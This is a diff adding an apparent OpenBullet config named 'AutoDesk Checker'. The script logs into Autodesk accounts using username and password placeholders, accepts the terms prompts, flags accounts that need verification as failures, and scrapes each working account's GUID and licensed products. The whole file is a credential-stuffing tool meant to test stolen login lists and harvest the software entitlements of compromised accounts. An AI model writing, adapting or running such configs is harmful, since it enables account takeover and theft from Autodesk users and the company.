@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "AutoDesk Checker",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-16T23:44:47.8783015+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+NAVIGATE "https://accounts.autodesk.com/Authentication/LogOn#username" 60 
+ELEMENTACTION XPath "//*[@id=\"userName\"]" 
+  SendKeys "<USER>" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"verify_user_btn\"]/span" 
+  Click "" -> VAR "" 
+FUNCTION Delay "1000" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"password\"]" 
+  SendKeys "<PASS>" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"btnSubmit\"]/span" 
+  Click "" -> VAR "" 
+FUNCTION Delay "1000" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"privacypolicy_checkbox\"]" 
+  Click "" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"tos_btn\"]/span[1]" 
+  Click "" -> VAR "" 
+FUNCTION Delay "1000" -> VAR "" 
+NAVIGATE "https://manage.autodesk.com/cep/#products-services/all" 60 
+ELEMENTACTION XPath "//*[@id=\"userName\"]" 
+  SendKeys "<USER>" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"verify_user_btn\"]/span" 
+  Click "" -> VAR "" 
+FUNCTION Delay "1000" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"password\"]" 
+  SendKeys "<PASS>" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"btnSubmit\"]/span" 
+  Click "" -> VAR "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Verification required" 
+NAVIGATE "https://manage.autodesk.com/service/user/loggedin-profile" 60 
+PARSE "<SOURCE>" LR "guid\":\"" "\"" Recursive=FALSE -> VAR "guid" "" "" 
+NAVIGATE "https://manage.autodesk.com/service/entitlement/getServices.json/<guid>" 60 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Name\":\"" 
+PARSE "<SOURCE>" LR "\"Name\":\"" "\"" Recursive=TRUE -> CAP "Product" "" "" 
+PARSE "<SOURCE>" LR "\"Type\":\"" "\"" Recursive=TRUE -> CAP "Type" "" "" 
